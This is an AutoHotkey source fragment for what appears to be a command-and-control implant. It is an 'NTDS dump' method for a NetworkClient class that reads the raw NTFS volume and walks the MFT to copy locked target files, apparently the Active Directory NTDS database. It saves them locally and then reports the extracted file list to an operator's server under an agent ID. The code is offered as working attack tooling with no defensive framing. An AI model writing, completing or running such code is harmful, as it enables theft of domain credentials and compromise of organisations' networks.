; ============================================================================
; NTDS DUMP MODULE
; This method should be added to the NetworkClient class
; ============================================================================

NTDSDump() {
    try {
        NTDSLogger.Init()

        ; Initialize NTFS parser
        NTFSParser.Init()

        ; Find and analyze NTFS
        ntfsLocation := NTFSParser.FindNTFSPartition()
        NTFSParser.AnalyzeNTFS(ntfsLocation)

        ; Scan MFT for target files
        NTFSParser.ScanMFTForFiles()

        ; Create output directory
        outputDir := A_ScriptDir . "\extracted"
        DirCreate(outputDir)

        ; Extract found files
        extractedFiles := Map()

        for fileKey, recordInfo in NTFSParser.foundFiles {
            outputPath := outputDir . "\" . NTFSParser.targetFiles[fileKey].name
            if (NTFSParser.ExtractFile(recordInfo, outputPath)) {
                extractedFiles[fileKey] := outputPath
                NTDSLogger.Log("Successfully extracted: " . fileKey)
            } else {
                NTDSLogger.Log("Failed to extract: " . fileKey)
            }
        }

        NTDSLogger.Log("Extraction complete! Files saved to: " . outputDir)
        NTDSLogger.Log("Found " . NTFSParser.foundFiles.Count . " of " . NTFSParser.targetFiles.Count . " target files")

    } catch as err {
        NTDSLogger.Log("ERROR: " . err.Message)
    } finally {
        NTDSLogger.Close()
    }

    ; Check for extracted files in the output directory
    outputPattern := A_ScriptDir "\extracted*"
    extractedDirs := []

    ; Find all extracted directories
    Loop Files, outputPattern, "D"
        extractedDirs.Push(A_LoopFileFullPath)

    if (extractedDirs.Length > 0) {
        ; Get the most recent extraction directory
        latestDir := extractedDirs[extractedDirs.Length]

        ; List extracted files
        extractedFiles := []
        Loop Files, latestDir "\*.*", "F"
            extractedFiles.Push(A_LoopFileName)

        if (extractedFiles.Length > 0) {
            fileList := ""
            for file in extractedFiles {
                fileList .= file . "`n"
            }

            message := Format("command_output|{}|NTDS dump completed successfully!`nExtracted files:`n{}`nLocation: {}",
                            this.agentID, fileList, latestDir)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        } else {
            message := Format("command_output|{}|NTDS dump completed but no files were extracted", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    } else {
        message := Format("command_output|{}|NTDS dump module executed but no output directory found", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    return true
}
